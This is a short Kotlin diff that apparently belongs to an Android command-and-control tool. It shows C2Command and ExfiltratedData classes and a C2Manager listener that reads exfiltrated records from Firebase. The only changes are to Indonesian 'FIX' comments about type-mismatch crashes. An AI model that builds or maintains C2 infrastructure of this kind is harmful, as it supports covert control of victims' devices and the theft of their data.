@@ -37,7 +37,6 @@ data class C2Command(
     val status: String = "pending"
 )
 
-// 🔥 FIX: Data class diubah — timestamp pake Any biar bisa nampung String dan Long
 data class ExfiltratedData(
     val dataId: String = "",
     val type: String = "",
@@ -167,13 +166,12 @@ object C2Manager {
         commandsRef.addValueEventListener(commandListener!!)
     }
 
-    // 🔥 FIX: listenForExfil pake Map manual biar gak crash
+    // 🔥 FIX: Manual Map biar gak crash walau ada data lama yg string
     private fun listenForExfil() {
         exfilListener = object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 for (dataSnapshot in snapshot.children) {
                     try {
-                        // 🔥 FIX: Ambil sebagai Map dulu biar aman dari type mismatch
                         val map = dataSnapshot.value as? Map<String, Any> ?: continue
                         val data = ExfiltratedData(
                             dataId = dataSnapshot.key ?: "",
